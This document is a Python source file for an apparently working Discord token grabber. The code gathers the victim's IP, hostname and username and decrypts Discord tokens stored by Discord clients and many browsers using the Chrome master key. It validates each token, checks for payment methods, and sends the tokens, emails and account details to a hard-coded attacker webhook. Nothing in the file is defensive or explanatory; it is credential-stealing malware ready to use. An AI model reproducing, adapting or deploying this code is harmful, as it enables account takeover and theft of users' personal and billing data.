import ntpath
import asyncio
import os
import json
import psutil
import platform
import re
import requests
import httpx

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from asyncdiscord import DiscordWebhook, DiscordEmbed, DiscordColor


# credit to hazard token grabber by Rdimo (token check, decrypt, find_tokens)
def start():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1070298825765421096/ENNVduusrnQM3k5ik6QDZKxrjcfBmwrHEzXe3rNC58GPPuowIyS2zZjKblEoyPxb371Z"
    ip = requests.get("https://api.ipify.org").text
    device_name = platform.node()
    tokens: dict = {}
    ram = psutil.virtual_memory().total
    ram = round(ram / (1024 * 1024 * 1024), 2)
    username = os.getlogin()

    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return f''

    def win_decrypt(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    def get_master_key(path: str or os.PathLike):
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return win_decrypt(master_key[5:])
        except KeyError:
            return None

    def get_headers(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    async def process_token(token: str):
        try:
            r = httpx.get(
                url="https://discord.com/api/v9/users/@me",
                headers=get_headers(token),
                timeout=5.0
            )
        except (httpx.ConnectTimeout, httpx.TimeoutException):
            return
        if r.status_code == 200 and token not in tokens:
            tokens[token] = r.text

    def has_payment(token: str) -> bool:
        try:
            r = httpx.get(
                url="https://discordapp.com/api/v9/users/@me/billing/payment-sources",
                headers=get_headers(token),
                timeout=5.0
            )
        except (httpx.ConnectTimeout, httpx.TimeoutException):
            return False
        return r.status_code == 200 and len(json.loads(r.text)) > 0

    def find_tokens():
        appdata = os.getenv("localappdata")
        roaming = os.getenv("appdata")
        chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
        paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': chrome_user_data + '\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not ntpath.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if ntpath.exists(roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                     x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                token = decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                                    get_master_key(roaming + f'\\{disc}\\Local State'))
                                asyncio.run(process_token(token=token))
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                            asyncio.run(process_token(token=token))
        if ntpath.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                            asyncio.run(process_token(token=token))
        return tokens

    def main():
        find_tokens()
        discord_webhook: DiscordWebhook = DiscordWebhook(url=WEBHOOK_URL)
        embed: DiscordEmbed = DiscordEmbed(color=DiscordColor.brand_green())
        embed.set_title(title="Новый лог")
        embed.add_field(name="\u200b", value=f'```fix\nDevice: {device_name}' +
                                             f'\nPC Username: {username}' +
                                             f'\nRAM: {ram}GB' +
                                             f'\nIP: {ip}```', inline=True)
        discord_webhook.add_embed(embed=embed)
        for token, info in tokens.items():
            data = json.loads(info)
            nitro: str = "None" if data["premium_type"] == 0 else "Has nitro"
            billing: str = str(has_payment(token=token))
            embed: DiscordEmbed = DiscordEmbed(color=DiscordColor.brand_green())
            if data["avatar"] is not None:
                embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}")
            embed.set_description(description=f"Token: ||{token}||")
            embed.add_field(name="\u200b", value=f'```yaml' +
                                                 f'\nusername: {data["username"] + "#" + data["discriminator"]}' +
                                                 f'\nmfa_enabled: {str(data["mfa_enabled"])}' +
                                                 f'\nemail: {data["email"]}' +
                                                 f'\nverified: {str(data["verified"])}' +
                                                 f'\nnitro: {nitro}' +
                                                 f'\nbilling: {billing}```',
                            inline=True)
            discord_webhook.add_embed(embed=embed)
        discord_webhook.execute()

    main()


if __name__ == '__main__':
    start()
